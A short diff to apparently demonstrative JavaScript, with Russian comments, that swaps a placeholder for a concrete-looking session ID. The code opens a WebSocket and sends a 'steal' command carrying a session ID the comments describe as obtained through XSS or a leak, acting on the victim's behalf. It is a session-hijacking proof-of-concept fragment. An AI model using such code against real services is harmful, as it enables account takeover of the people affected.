@@ -11,7 +11,7 @@
 
     ws.onopen = function() {
         // Имитируем получение sessionId из другого источника (например, через XSS или утечку)
-        var stolenSessionId = 'example_session_id'; // Это должно быть украдено, здесь для демонстрации
+        var stolenSessionId = 'rtg7q68q36p'; // Это должно быть украдено, здесь для демонстрации
 
         // Отправка команды на сервер от имени жертвы
         ws.send(JSON.stringify({"action":"steal","data": stolenSessionId}));
